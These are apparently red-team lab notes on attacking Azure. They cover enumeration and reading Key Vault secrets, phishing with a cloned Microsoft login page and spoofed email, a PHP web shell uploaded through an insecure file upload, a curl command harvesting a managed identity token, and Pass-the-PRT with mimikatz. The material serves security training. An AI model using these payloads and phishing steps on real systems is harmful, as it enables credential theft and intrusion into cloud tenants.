Phase 3: Initial Access Attacks & Tokens

Enumeration - Az Module (Azure PowerShell)

The Az module is the "Infrastructure as Code" tool. While Mg Graph is excellent for querying identity information, Az PowerShell is built specifically for managing Azure resources like Virtual Machines, Storage Accounts, and Key Vaults.

Connection to Azure

Similar to MgGraph, we need to connect to Azure first. This can be done using interactive login or by using an access token.

Connect-AzAccount

Or using a token:

Connect-AzAccount -AccessToken $Token -AccountID 'object-id'

Subscription & Context Management

Before enumerating resources, we need to identify which subscriptions we have access to.

Get-AzSubscription

Select a subscription to work with:

Select-AzSubscription -SubscriptionName "Subscription Name"

To see your current context:

Get-AzContext

Resource Group Enumeration

Resource Groups are logical containers for Azure resources.

Get-AzResourceGroup

Resource Enumeration

List all resources in the current subscription:

Get-AzResource

List resources in a specific Resource Group:

Get-AzResourceGroup -Name "Engineering" | Get-AzResource

Azure Key Vaults

Key Vault is the "Password Manager" for Azure. If you can read Secrets from a Key Vault, you have won.

Enumerating Key Vaults

Get-AzKeyVault

Access Policy vs RBAC

Key Vaults support two permission models:

  • Access Policy: The legacy model. You are granted specific permissions (Get, List, Set, etc.) to Secrets, Keys, and Certificates.
  • RBAC (Recommended): You are assigned Azure Roles (like "Key Vault Reader") that grant access to all secrets in the vault.

Reading Secrets

First, get the vault object:

$vault = Get-AzKeyVault -VaultName "defcorphq-kv"

Then, list all secrets:

Get-AzKeyVaultSecret -VaultName $vault.VaultName

To read the actual secret value:

$secret = Get-AzKeyVaultSecret -VaultName "defcorphq-kv" -Name "SQLPassword"
$secret.SecretValueText

Attacker View: If you find credentials in a Key Vault, you can use them to escalate privileges or access other systems.

Azure Storage Accounts

Storage Accounts are used to store blobs, files, queues, and tables. They are identified by a unique name within the blob.core.windows.net namespace.

Enumerating Storage Accounts

Get-AzStorageAccount

Storage Account Keys

Every Storage Account has two "master passwords" called Access Keys. If you have one of these keys, you have full access to the entire Storage Account, equivalent to having Root access to that resource.

Get-AzStorageAccountKey -ResourceGroupName "Engineering" -Name "defcorphqeng"

Blob Storage Enumeration

Blobs are used to store files, backups, and sometimes credentials.

$storage = Get-AzStorageAccount -ResourceGroupName "Engineering" -Name "defcorphqeng"
Get-AzStorageContainer -Context $storage.Context

List blobs in a container:

Get-AzStorageBlob -Container "private" -Context $storage.Context

Download a blob:

Get-AzStorageBlobContent -Container "private" -Blob "config.json" -Destination "C:\temp\" -Context $storage.Context

Initial Access - Phishing

Phishing via Microsoft Services

In a red team engagement, we need to obtain valid tokens to proceed with our assessment. Phishing is one of the most effective ways to achieve this.

The Cookie Stealer Technique

The most efficient technique for capturing a user's session involves creating a clone of a Microsoft login page. When the user enters their credentials, we capture both the username and password, then use an automated script to obtain a valid token on their behalf.

To do this, we first need to host a malicious website that mimics Microsoft's login interface.

We can utilize tools like Evilginx or GoPhish to execute this attack. In this lab, we will explore a different approach using the MITM tool.

Hosting the Phishing Page

We set up a web server to host our fake login page and JavaScript that will steal the credentials.

cd /var/www/html
wget https://raw.githubusercontent.com/Glitch-Token-Stealer/FiercePhish/main/index.html

Modify the index.html to include our exfiltration server URL.

Sending the Phishing Email

We use Email spoofing to send the phishing email. Services like emkei.cz allow us to send emails with forged sender addresses.

The target receives an email appearing to be from HR.

When the user clicks the link and enters their credentials, we capture them.

Token Acquisition

With the captured credentials, we can now authenticate and obtain tokens.

Import-Module .\AADInternals.psd1
Get-AADIntToken -ClientId "d3590ed6-52b3-4682-8fe7-2435e2344ea16" -Resource "https://graph.microsoft.com" -RedirectUri "urn:ietf:wg:oauth:2.0:oob" -Username "mark@defcorphq.com" -Password "Welcome1!"

Initial Access - App Service Abuse

Insecure File Upload

Azure App Service is a Platform-as-a-Service (PaaS) offering. In this lab the defcorphqcareer site is hosted on this platform.

The security of this service relies entirely on the quality of the deployed code. If the developer created a feature to upload resumes but failed to validate the file type properly, we can upload an executable script instead of a document.

The Identity Vector: Managed Identities (MSI)

The most critical architectural concept in this lab is the Managed Identity. In Azure, modern applications are designed to use Identity instead of passwords.

The defcorphqcareer application is assigned a unique Managed Identity. This gives the application an automatic identity in Entra ID, allowing it to access other Azure resources without storing credentials in code.

If we can exploit the file upload vulnerability to execute code on the App Service, we can potentially access the Managed Identity token and pivot to other Azure resources.

First, we need to find the target website and identify the file upload functionality.

<?php 
system($_REQUEST['cmd']);
?>

Upload this as a .phtml file to get a web shell.

When we navigate to the URL of our uploaded file the Azure App Service executes our PHP code.

After uploading the web shell, access it and pass the 'env' command to check if a managed identity is assigned to the app service.

https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env

Look for environment variables IDENTITY_HEADER and IDENTITY_ENDPOINT

Harvesting the Cloud Token

We then use this command execution to pivot from the operating system to the identity layer.

<?php 
system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>

Lateral Movement - Pass-the-PRT & Intune Cloud to On-Prem

Primary Refresh Token Extraction and Protection

The Primary Refresh Token acts as the persistent digital identity card for a user on a specific device. We target this specific artifact because retrieving it allows us to impersonate the user from a different location.

We typically execute the extraction by interacting with the Local Security Authority Subsystem Service where the CloudAP security provider handles the authentication keys in system memory. We use tools like mimikatz to perform this memory scrapping.

Pass-the-PRT Attack Mechanics

We weaponize the stolen Primary Refresh Token using the Pass-the-PRT technique. We inject the decrypted token directly into our own browser session or attack tool which tricks the Azure authentication endpoint into recognizing our traffic as coming from the victim's verified laptop.

This action is critical because it grants us instant authenticated access to the user's applications such as the Azure Portal or Office 365 without us ever needing to know their actual password or needing access to their multi-factor authentication device.

PRT Renewal and Conditional Access Bypass

The longevity of our access relies on understanding how the Primary Refresh Token can be renewed. As long as the victim device remains active and can be reached, we can potentially extend our access by renewing the PRT.
